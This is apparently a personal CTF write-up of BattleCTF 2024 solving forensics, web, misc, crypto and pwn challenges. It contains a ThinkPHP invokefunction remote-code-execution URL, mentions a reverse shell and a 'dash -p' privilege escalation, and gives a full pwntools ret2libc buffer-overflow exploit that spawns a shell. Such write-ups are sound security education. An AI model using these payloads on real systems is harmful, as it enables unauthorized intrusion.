---
title: BattleCTF
date: 2024-10-21 11:59:31 +0100
categories: [pwn, CTF]
tags: [AD1, rc4_encrypt]
math: true
mermaid: true
media_subpath: /assets/posts/2024-10-21-BattleCTF
image:
  path: preview.png
---



Challenges solved
- Do[ro x2] (Forensics)
- Hmmmm!... (Web)
- Rules (Misc)
- Invite Code (Misc)
- poj

## Do[ro x2]
We are provided with an AD1 Evidence File.
Opening up the file in FTK Imager

![image](https://github.com/user-attachments/assets/a4b86b7a-a32e-40f8-b867-d19189a324d2)
We are prompted to provide a password, after a lot of guessed passwords. I decided to look at the challenge name and use Dororo as the password i.e (Do[ro x2]) which worked

![image](https://github.com/user-attachments/assets/f5ee9390-7f74-48a2-804f-3345304e10f1)
Inputing the correct password, getting the flag was easy


## Hmmmm!...
After some digging i noticed the site has a vulnerable thinkphp

so looking for exploits this worked

```http://chall.bugpwn.com:8083/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id```
the next thing is for me to get a reversrse shell

 i upload a shell.sh shell.sh file and executed it 
![image](https://private-user-images.githubusercontent.com/51336409/378576954-1bd8953c-f1a8-4871-a928-d2360fdbb6fe.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NjYzMzg0ODcsIm5iZiI6MTc2NjMzODE4NywicGF0aCI6Ii81MTMzNjQwOS8zNzg1NzY5NTQtMWJkODk1M2MtZjFhOC00ODcxLWE5MjgtZDIzNjBmZGJiNmZlLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTEyMjElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUxMjIxVDE3Mjk0N1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTc2YjY5NmNhOWQ3MjUxM2QxZGVkMWIyYjNhMWViNWQxMDZjY2YxYThiYzIwZDk1YWIxYzkwNDY5ZDhhYzUzYzAmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.1S6fI93UPjIqFckSGoRTWLVEzJvsQibsdmoebQi7nng)

For privilege escalation i did ```dash -p``` and got root
![image](https://private-user-images.githubusercontent.com/51336409/378577190-19ed86ff-346f-4478-a204-6832542317ee.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NjYzMzg0ODcsIm5iZiI6MTc2NjMzODE4NywicGF0aCI6Ii81MTMzNjQwOS8zNzg1NzcxOTAtMTllZDg2ZmYtMzQ2Zi00NDc4LWEyMDQtNjgzMjU0MjMxN2VlLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTEyMjElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUxMjIxVDE3Mjk0N1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTA1ZWFhMTY5YzVlOTkxMmJiNGZmODFkOWE3ZTMwOWZmYjc4YWNiMjhiZjk3MjBlYjlkM2I4ZjllZjU4MmU2ODcmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.cT-wzq0ZQcPkd-pA7MmAwWNu37k8Q7uDdENS4zd3ttQ)


## Rules
Going over to the discord channel and checking the #announcement page gives the flag

```Flag: battleCTF{HereWeGo}```

## Invite Code
We were given an hex, and after decoding the hex we got
```UWNYZ1c5dzR3UWQvZWIudXR1b3kvLzpzcHR0aA=https://bugpwn.com/invite.ini```
we only need the url, the base64 is just a yotube link to a rick roll video or so

checking the link i got this
```H4sIAKvQ/2YC/02TW08bQQyFn+FXHCKk9iXN3C9SEjS7MytVlIsAqUKKVC1JgJRk0yahTf997VC1fUBMduzj48+eh3eTfTud7OezyV4I+rO795N90MOz/WqJH/PNdrHuRj35QfQw76br2aJ7GvVed4/90MN213azdrnu5qNet+7hbHw8PMlX9d39dcHrlpJxe397Vy5AF2+/V+1+1AuyNz4+Onyhm6Oj4XL9tOi6djUfP7S73XI+3T0OB/8+csi3drv9ud7MxqeqPZXqdD59Xcjl3eri8/nNxY35OjPm5fHq5XoflvP2k9id18/d5WJmlpfp4XkzuH++vt5/Hw7+yrCmmW6+UFObX992Y2FhGygHbxArhIzsISJMRKngJKKBzRAePkNqpIQS4C3qDJcgC3yEVMiHc6BbD9WwZiY1j2IgSFNxLp2DQimQAqlG8tAJFQUbVArJIFloh5KgakgHIRAiUkEVoBREhcZCBtQJQkMr1HR2cBVsQBAoNbyA93CF020N67iia5Ayp9cWkW6ptciapnDpKBAtqgomo2T2HCNiYGMkmA2K4r6oC0r3jkuzKwcpkSp4DeeRBDMhq7pGoHYcQ1OSg73kWjlyjCakZFvAVn+gkckouaiMcBriwIHCBBkjA4Kdk7ImZWKu0VAi9VtQEw3SSYwxVMjNARcdyADhItsNGsO068JVSLPRUILh1wpWcYr1PBobWZBKGIdMIpZjuMeaN4FGT1LUOw8u83Dpig5Bw0rmT1I68HxV4nQq4Wgomb9XtD+aDTMKd+jIss/KMzoteMcItW+4HZqg9LwANDuqSGBpKOTNCd4cc+iXBlFlNA2bTBLaM2eaIyEljFGhoXEHdss2AjNnPsShGg7+33t6hwN+iPRCD/+348lm0g1P+n28vcX6jramuflIy6YE4ez3DxG/AVECNBs5BAAA```

I noticed that it was a base64 encoded zip file

decoding and extracting the zip file i got this
```xml
<?xml version="1.0" encoding="utf-8" standalone="no" ?>
<!DOCTYPE users SYSTEM >
<users max="81">
        <user >
                <loginname>battlectf</loginname>
                <password>$2a$12$ecui1lTmMWKRMR4jd44kfOkPx8leaL0tKChnNid4lNAbhr/YhPPxq</password>
                <4cr_encrypt>05 5F 26 74 9B 8D D7 09 49 EB 61 94 5D 07 7D 13 AA E8 75 CD 6A 1E 79 12 DA 1E 8A E7 2F 5F DB 87 E4 0D D2 13 E4 82 EE 10 AC A7 3A BF 54 B2 A4 A5 36 EA 2C 16 00 89 AE B8 22 0B F5 18 CA 03 32 C8 C6 6B 58 80 EC 70 77 6E 16 5C 56 82 6F AD 0B C5 97 69 E9 B8 4E 54 90 95 BB 4D ED 87 99 98 BF EC D4 E2 8A 0D C5 76 03 89 A6 11 AB 73 67 A0 75 AE 3C 84 B6 5D 21 03 71 B8 D9 A0 3B 62 C0 5B 12 DA 5C 91 87 19 63 02 A4 3B 04 9F E0 AD 75 3E 35 C3 FB 1B 5E CB F0 5A A7 8B DF 00 8B DC 88 24 EF F4 EE CE 5C 3B F3 20 10 C2 52 DF 57 D2 59 5E 3E 46 D0 85 10 89 AC 09 07 EF C5 EE 1D 2F 89 1D 83 51 C6 52 38 13 2A D0 20 66 6D 52 B1 93 1B 21 06 9F E5 00 B7 AB 30 EB 98 7F CB 80 17 36 16 EF 73 BB 59 60 E4 4B F0 8A BD FF 85 A1 37 5D 4E C0 91 92 F2 68 C5 20 68 A0 A7 84 EB</4cr_encrypt>
        </user>
</users>\r\n<!-- battleCTF AFRICA 2024 -->\r\n
```



The last one looks like some sort of encryption ```rc4_encrypt``` so we can assume that we need to rc4 decrypt that hex value, but that requires the key

Since there's also a password hash we can assume that the rc4 key is the password plaintext value
From this I used JTR to crack the hash and that took time but yea it cracks!

The password is ```nohara```
At this point I just looked for a rc4 decrypt implementation in python and got this[https://pycryptodome.readthedocs.io/en/latest/src/cipher/arc4.html]

So we just need to call the ARC4 class with the password and use the decrypt function

Doing that I got the decoded message
```python
from arc4 import ARC4

password = "nohara".encode()
arc4 = ARC4(password)
ct = bytes.fromhex("05 5F 26 74 9B 8D D7 09 49 EB 61 94 5D 07 7D 13 AA E8 75 CD 6A 1E 79 12 DA 1E 8A E7 2F 5F DB 87 E4 0D D2 13 E4 82 EE 10 AC A7 3A BF 54 B2 A4 A5 36 EA 2C 16 00 89 AE B8 22 0B F5 18 CA 03 32 C8 C6 6B 58 80 EC 70 77 6E 16 5C 56 82 6F AD 0B C5 97 69 E9 B8 4E 54 90 95 BB 4D ED 87 99 98 BF EC D4 E2 8A 0D C5 76 03 89 A6 11 AB 73 67 A0 75 AE 3C 84 B6 5D 21 03 71 B8 D9 A0 3B 62 C0 5B 12 DA 5C 91 87 19 63 02 A4 3B 04 9F E0 AD 75 3E 35 C3 FB 1B 5E CB F0 5A A7 8B DF 00 8B DC 88 24 EF F4 EE CE 5C 3B F3 20 10 C2 52 DF 57 D2 59 5E 3E 46 D0 85 10 89 AC 09 07 EF C5 EE 1D 2F 89 1D 83 51 C6 52 38 13 2A D0 20 66 6D 52 B1 93 1B 21 06 9F E5 00 B7 AB 30 EB 98 7F CB 80 17 36 16 EF 73 BB 59 60 E4 4B F0 8A BD FF 85 A1 37 5D 4E C0 91 92 F2 68 C5 20 68 A0 A7 84 EB")

print(arc4.decrypt(ct).decode())
```
```Flag: battleCTF{pwn2live_d7c51d9effacfe021fa0246e031c63e9116d8366875555771349d96c2cf0a60b}```


## poj

Decompiling the binary

main()
```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  write(1, "Africa battle CTF 2024\n", 0x17uLL);
  printf("Write() address : %p\n", &write);
  return sub_115C();
}
```
it gives a libc leak for the write function then calls function ```sub_115C```

sub_115c()
```c
ssize_t sub_115C()
{
  _BYTE buf[64]; // [rsp+0h] [rbp-40h] BYREF

  return read(0, buf, 0x100uLL);
}
```
buffer overflow because it's reading at most ```0x100``` bytes into a buffer that can only hold up ```64``` bytes of data

From this point to get the libc base we just subtract the libc leak of write with the offset of write@libc

And with the libc base we can just go ahead with ROP

Since i couldnt debug remotely i just went ahead exploiting it on the remote instance

Solve Script

```python
#!/usr/bin/env python3

from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './poj_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'
rop = ROP(elf)
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

libc = ELF("libc.so.6")
rop = ROP(libc)



# Start program
io = start()

io.recvuntil(b'Write() address : ')
leak = io.recvline().strip()
leak_address = int(leak, 16)
libc_base = leak_address - 0xff4d0
libc.address = libc_base


print("libc_base: ", hex(libc_base))
system = libc_base + 0x4dab0
binsh = libc_base + 0x197e34

pop_rdi_jmp_rax = 0x28215 #: pop rdi; jmp rax; 
pop_rax = 0x114d #pop rax; ret;
binsh = libc_base + 0x197e34
system = libc_base + 0x4dab0
ret = 0x2668c 

pop_rdi = 0x28215

payload = b'A' * 72       
payload += p64(libc_base + pop_rdi)
payload += p64(binsh)
payload += p64(libc_base + ret) 
payload += p64(system)


io.clean()
io.sendline(payload) 
   

# Got Shell?
io.interactive()
```












